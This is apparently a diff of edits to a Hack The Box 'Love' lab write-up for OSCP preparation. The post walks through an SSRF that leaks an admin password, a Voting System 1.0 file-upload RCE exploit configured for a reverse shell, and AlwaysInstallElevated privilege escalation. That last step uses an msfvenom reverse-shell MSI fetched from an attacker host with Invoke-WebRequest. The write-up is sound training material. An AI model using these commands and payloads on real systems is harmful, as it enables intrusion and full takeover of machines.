@@ -7,7 +7,7 @@ tags: ["Hack The Box","OSCP"]
 {% assign imgDir="HTB-Love-Writeup" %}
 
 # Introduction
-The hack the box machine "Love" is an Easy machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge about web enumeration, SSRF vulnerabilities, exploit identification, the Windows Registry and the AlwaysInstallElevated policy. Albeit being rated as Easy, this machine required multiple steps for acheiving remote code execution.
+The hack the box machine "Love" is an easy machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge about web enumeration, SSRF vulnerabilities, exploit identification, the Windows Registry and the AlwaysInstallElevated policy. Albeit being rated as easy, this machine requires several exploitation steps before remote code execution can be achieved, which is somewhat unusual for easy machines.
 
 <img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">
 
@@ -134,7 +134,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 223.48 seconds
 {% endhighlight %}
 
-We see web applications at the ports 80, 443, 5000, 5985, 5986, and 47001. Web applications are usually a good starting point during pentests since they can contain custom web applications with multiple vulnerabilties or host old software which already has known vulnerabilties. We can start by checking out the web applications which are reachable over HTTP. In other words, the ports 80, 5000, 5985 and 47001. Visiting these ports in a browser results in a `200 OK`, `403 Forbidden`, `404 Not Found` and `404 Not Found` respectively. 
+We see web servers at the ports 80, 443, 5000, 5985, 5986 and 47001. Web servers are usually a good starting point during pentests since they can contain custom web applications with multiple vulnerabilties or host old web applications which have known vulnerabilties. We can start by checking out the web applications which are reachable over HTTP. In other words, the ports 80, 5000, 5985 and 47001. Visiting these ports in a browser results in a `200 OK`, `403 Forbidden`, `404 Not Found` and `404 Not Found` respectively. 
 
 ![port80](/assets/{{ imgDir }}/port80.png)
 
@@ -144,11 +144,11 @@ We see web applications at the ports 80, 443, 5000, 5985, 5986, and 47001. Web a
 
 ![port47001](/assets/{{ imgDir }}/port47001.png)
 
-The login prompt at port 80, does not appear to offer any possibility for us to register an account that we could use to log in. Before proceeding with any more enumeration of these web servers, we could check out the web applications which are handling HTTPS requests on port 443 and 5986. If we navigate to port 443 in Firefox, we get the self signed certificate warning below. 
+The login prompt at port 80, does not appear to offer any possibility for us to register an account that we could use to log in. Before proceeding with any more enumeration of these web servers, we could check out the web servers which communicate over HTTPS on port 443 and 5986. If we navigate to port 443 in Firefox, we get the self signed certificate warning below. 
 
 ![SelfSigned](/assets/{{ imgDir }}/SelfSigned.png)
 
-If we press "Advanced..." followed by "View Certificate", we can see more information about the certificate. This informs us that the two domain names "stage.love.htb" "and love.htb" correspond to the target host.
+If we press `Advanced...` followed by `View Certificate`, we can display more information about the certificate. This information tells us that the two domain names `stage.love.htb` and `love.htb` correspond to the target host.
 
 ![domainName](/assets/{{ imgDir }}/domainName.png)
 
@@ -163,7 +163,7 @@ We can add these to our `/etc/hosts` file as demonstrated below. This ensures th
 └─$ 
 {% endhighlight %}
 
-Next, we can try to navigate to `love.htb` and `staging.love.htb` on port 80, 443, 5000, 5985, 5986, and 47001 to see if this changes the content in any way. Upon doing this, we discover a file scanning service at [http://staging.love.htb](http://staging.love.htb). This service appears to be under construction and offers a form for receiving email updates on the progress. In addition, this pages inclues two buttons in the top-left corner. 
+Next, we can try to navigate to `love.htb` and `staging.love.htb` on port 80, 5000, 5985, and 47001 to see if this results in different responses than those we saw earlier. Upon doing this, we discover a file scanning service at [http://staging.love.htb](http://staging.love.htb). This service appears to be under construction and offers a form for receiving email updates on the development progress. In addition, this page includes two buttons in the top-left corner. 
 
 ![staging.love.htb](/assets/{{ imgDir }}/staging.love.htb.png)
 
@@ -186,9 +186,9 @@ Accept: */*
 
 {% endhighlight %}
 
-Shortly after submitting the URL, the target connects back to us on port 80 asking for the file, as shown above. This means that we have a Server Side Request Forgery (SSRF) vulnerability. These types of vulnerabilties can be useful since they can enable us to communicate with hosts and ports which only the vulnerable host can access.
+Shortly after submitting the URL, the target connects back to us on port 80 asking for the file, as shown above. This means that we have a Server Side Request Forgery (SSRF) vulnerability. This type of vulnerabilties can be useful since they can enable us to communicate with hosts and ports which only the vulnerable host can access.
 
-We could try to use the SSRF vulnerability to access the web application running on port 5000 which gave us a `403 Forbidden` error earlier. This web application wasn't accessible from another host but it might be accessible for requests originating from the target host itself. We can try this by submitting the URL "http://localhost:5000". Upon doing this, we discover that the web application did not reject us. Instead, it provides us with the string `@LoveIsInTheAir!!!!` which is the password of to the admin account.
+We could try to use the SSRF vulnerability to access the web application running on port 5000 which gave us a `403 Forbidden` error earlier. This web application wasn't accessible from another host but it might be accessible for requests originating from the target host itself. We can try this by submitting the URL [http://localhost:5000](http://localhost:5000). Upon doing this, we discover that the web application did not reject us. Instead, it provides us with the string `@LoveIsInTheAir!!!!` which is the password of to the admin account.
 
 ![adminCreds](/assets/{{ imgDir }}/adminCreds.png)
 
@@ -196,7 +196,7 @@ However, attempting to log in with this password and common admin usernames at t
 
 ![attemptLogin](/assets/{{ imgDir }}/attemptLogin.png)
 
-There are two likely reasons for our authentication failues. Either, we have the wrong admin username or we are at the wrong login page as it is common to have a separate login page for administrative users. We can search for an admin login page by using a directory brute forcing tool such as [ffuf](https://github.com/ffuf/ffuf). Note that we use a lowercase wordlist since we are dealing with a PHP application which normally performs routing based on file paths and that Windows file paths are case insensitive. Using a lowercase wordlist rather than a case-sensitive wordlist could thus be faster.
+There are two likely reasons for our authentication failues. Either, we have the wrong username or we are at the wrong login page as it is common to have a separate login page for administrative users. We can search for an admin login page by using a directory brute forcing tool such as [ffuf](https://github.com/ffuf/ffuf). Note that we use a lowercase wordlist since we are dealing with a PHP application which means that routing is based on file paths and that Windows file paths are case insensitive. Using a lowercase wordlist rather than a case-sensitive wordlist could thus be faster.
 
 <!--
 Windows host + file path routing in php => Lowercase wordlist
@@ -270,8 +270,6 @@ From the results, we discover the endpoint `/admin`. Navigating to this endpoint
 
 ![logInOK](/assets/{{ imgDir }}/logInOK.png)
 
-We can search for known exploits for this web application using searchsploit. Upon doing this, we find an [authenticated remote code execution exploit](https://www.exploit-db.com/exploits/49445) for version 1.0 of a PHP web application named "Voting System". We copy this exploit to a file named "exploit.py" in the current directory.
-
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ @@searchsploit "voting system RCE"@@
@@ -296,7 +294,7 @@ File Type: Python script, ASCII text executable, with very long lines (6002)
 └─$ @@cp /usr/share/exploitdb/exploits/php/webapps/49445.py ./exploit.py@@
 {% endhighlight %}
 
-The full exploit is shown below.
+We can search for known exploits for this web application using searchsploit. Upon doing this, we find an [authenticated remote code execution exploit](https://www.exploit-db.com/exploits/49445) for version 1.0 of a PHP web application named "Voting System". We copy this exploit to a file named "exploit.py" in the current directory. The full exploit is shown below.
 
 {% highlight python linenos %}
 # Exploit Title: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
@@ -417,7 +415,7 @@ CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"
 {% endhighlight %}
 {% endcomment %}-->
 
-At the top of the exploit, there are four parameters we need to configure. We configure them as shown below. Note that the `REV_IP` should be set to the IP address of our host over the VPN connection as this is where the target host will connect to provide a reverse shell. Finally, we also need to remove "votesystem" from the `INDEX_PAGE`, `LOGIN_URL`, `VOTE_URL` and `CALL_SHELL` parameters since the voting system is located at the root of the web server in our case. 
+At the top of the exploit, there are five parameters we need to configure. We configure them as shown below. Note that the `REV_IP` parameter should be set to the IP address of our host over the VPN connection as this is where the target host will connect to provide a reverse shell. Finally, we also need to remove `/votesystem` from the `INDEX_PAGE`, `LOGIN_URL`, `VOTE_URL` and `CALL_SHELL` parameters since the voting system is located at the root of the web server in our case. 
 {% highlight python linenos %}
 # --- Edit your settings here ----
 IP = "love.htb" # Website's URL
@@ -463,11 +461,11 @@ C:\xampp\htdocs\omrs\images>
 After a couple of seconds, we receive a shell on the target as a user named "phoebe", as can be seen above.
 
 # Privilege Escalation
-To understand how to privesc the target we must first familiarize ourselves with the Windows Registry. The Windows Registry is a hierarchical database which stores Windows-specific settings through the usage of keys and values. The Windows Registry is organized into a hierarchy of keys. Each key consist of one root key and any amount of subkeys. For example, the key `HKEY_LOCAL_MACHINE\Software\Microsoft` refers to the subkey `Microsoft` of the subkey `Software` of the `HKEY_LOCAL_MACHINE` root key. One way to interact with the registry is through the built-in Registry Editor program in Windows. We can start this program by pressing `CTRL+r`, typing "regedit" and pressing enter.
+To understand how to privesc the target, we must first familiarize ourselves with the Windows Registry. The Windows Registry is a hierarchical database which stores Windows-specific settings through the usage of keys and values. The Windows Registry is organized into a hierarchy of keys. Each key consist of one root key and any amount of subkeys. For example, the key `HKEY_LOCAL_MACHINE\Software\Microsoft` refers to the subkey `Microsoft` of the subkey `Software` of the `HKEY_LOCAL_MACHINE` root key. One way to interact with the registry is through the built-in Registry Editor program in Windows. We can start this program by pressing `CTRL+r`, typing "regedit" and pressing enter.
 
 ![registry](/assets/{{ imgDir }}/registry.png)
 
-We can use the input field at the top of the GUI, to navigate to a certain key. For example, we can navigate to `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` as shown above. This location in the registry contains environment variables such as the `Path` variable. Another way to interact with the registry is to use the `reg` command in cmd, as demonstrated below. Note that the key is specified after `reg query` and that the value we want to extract from this key is specified using the `/v` flag.
+We can use the input field at the top of the GUI, to navigate to a certain key. For example, we can navigate to `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` as shown above. This location contains environment variables such as the `Path` variable. Another way to interact with the registry is to use the `reg` command in cmd, as demonstrated below. Note that the key is specified after `reg query` and that the value we want to extract from this key is specified using the `/v` flag.
 
 {% highlight none linenos %}
 C:\Users\Thomas>@@reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path@@
@@ -476,7 +474,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
     @@@Path@@@    REG_SZ    @@@C:\Program Files\Microsoft\jdk-11.0.12.7-hotspot\bin;C:\Program Files (x86)\VMware\VMware Player\bin\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files (x86)\NVIDIA Corporation\PhysX\Common;C:\Program Files\NVIDIA Corporation\NVIDIA NvDLISR;C:\Program Files\PuTTY\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files\dotnet\;C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\@@@
 {% endhighlight %}
 
-There are a large amount of different registry values that could be interesting when attempting to discover privilege escalation possiblities. One of these is `AlwaysInstallElevated` which can be found at `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` and `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`. If this value is set to `0x1` in both of these locations, the current user can install MSI files in the context of the SYSTEM account. This means that anyone could compromise the SYSTEM user by installing a malicious MSI file. If we inspect the content of these two registry locations on the target host, we can see that this feature is enabled. 
+There are a large amount of different registry values that could be interesting when attempting to discover privilege escalation possiblities. One of these is `AlwaysInstallElevated` which can be found at `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` and `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`. If this value is set to `0x1` in both of these locations, the current user can install MSI files in the context of the `SYSTEM` account. This means that this user could compromise the `SYSTEM` account by installing a malicious MSI file. If we inspect the content of these two registry locations on the target host, we can see that `AlwaysInstallElevated` is enabled. 
 
 {% highlight none linenos %}
 C:\xampp\htdocs\omrs\images>@@reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated@@
@@ -493,7 +491,7 @@ HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
     @@@AlwaysInstallElevated@@@    REG_DWORD    @@@0x1@@@
 {% endhighlight %}
 
-We can generate a malicious MSI file with msfvenom as shown below. The `windows/shell_reverse_tcp` is an unstaged reverse shell payload, meaning that we can catch it with a netcat listener. The `Lhost` and `lport` parameters specify an IP address and a port number which the reverse shell payload should connect back to. Furthermore, we use the `-f` flag to specify that we want the payload in the format of an MSI file. We save the resulting MSI file in a file named "rs.msi".
+We can generate a malicious MSI file with msfvenom as shown below. The `windows/shell_reverse_tcp` payload is an <i>unstaged</i> reverse shell payload, meaning that we can catch it with a netcat listener. The `lhost` and `lport` parameters specify an IP address and a port number which the reverse shell payload should connect back to. Furthermore, we use the `-f` flag to specify that we want the payload in the format of an MSI file. We save the resulting MSI file in a file named "rs.msi".
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -519,7 +517,7 @@ Try the new cross-platform PowerShell https://aka.ms/pscore6
 Invoke-WebRequest -Uri "http://10.10.16.4/rs.msi" -OutFile "C:\Windows\temp\rs.msi"
 {% endhighlight %}
 
-Shortly after executing the command, an entry in the in the output Python web server appears, indicating that the download was successful.
+Shortly after executing the command, the Python web server logs indicate that the file was downloaded by the target.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -550,5 +548,5 @@ whoami
 C:\WINDOWS\system32>
 {% endhighlight %}
 
-As soon as we execute the malicious MSI file, our netcat listener receives a connection and we obtain a shell as the `SYSTEM` account on the target host!
+A couple of milliseconds after executing the malicious MSI file, our netcat listener receives a connection and we obtain a shell as the `SYSTEM` account on the target host!
 
